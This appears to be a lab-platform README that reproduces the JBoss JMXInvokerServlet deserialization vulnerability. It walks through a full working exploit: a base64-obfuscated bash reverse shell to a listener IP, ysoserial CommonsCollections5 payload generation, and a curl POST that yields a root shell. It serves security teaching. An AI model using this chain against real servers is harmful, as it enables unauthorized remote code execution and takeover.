# JBoss JMXInvokerServlet Deserialization Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability ID** | No CVE Number |
| **Affected Versions** | JBoss 5.x/6.x |
| **Vulnerability Type** | Java Deserialization |
| **Severity** | 🔴 High |
| **Default Port** | 8080 |
| **Affected Component** | /invoker/JMXInvokerServlet / Apache Commons Collections |

## Vulnerability Overview

This is a classic JBoss deserialization vulnerability. JBoss reads user-supplied objects in requests to `/invoker/JMXInvokerServlet`, then leverages Gadgets in Apache Commons Collections to execute arbitrary code.

## Vulnerability Reproduction

After the target machine starts (1-3 minutes for initialization), access `http://your-ip:8080/` to view the JBoss default page:

![JBoss Default Page](https://static.nextcyber.cn/attachments/images/course/task/c72947f8233a445f888b107d5142dfdb.png)

When JBoss processes requests to `/invoker/JMXInvokerServlet`, it deserializes the object data. We use the `CommonsCollections5` gadget chain from [ysoserial](https://github.com/frohoff/ysoserial) to reproduce the vulnerability. Generate the payload:

```bash
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
```

```bash
┌──(root㉿nextcyber)-[~]
└─# wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

┌──(root㉿nextcyber)-[~]
└─# java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser

┌──(root㉿nextcyber)-[~]
└─# ls   
poc.ser  ysoserial-all.jar
```

## Reverse Shell

Start a local listener on port `1234`, then send the `poc.ser` file content as the `POST Body`:

```bash
curl http://192.168.2.47:8080/invoker/JMXInvokerServlet --data-binary @poc.ser
```

![Reverse Shell Success](https://static.nextcyber.cn/attachments/images/course/task/1bcbe3c836204e18b839e86d2124ee3a.png)

Successfully obtained the shell as the root user.

---

## Lab Practice

Practice on [NextCyber Lab](https://app.nextcyber.cn/courses/91).

## Disclaimer

This documentation is for security research and learning purposes only. Do not use it for illegal activities.
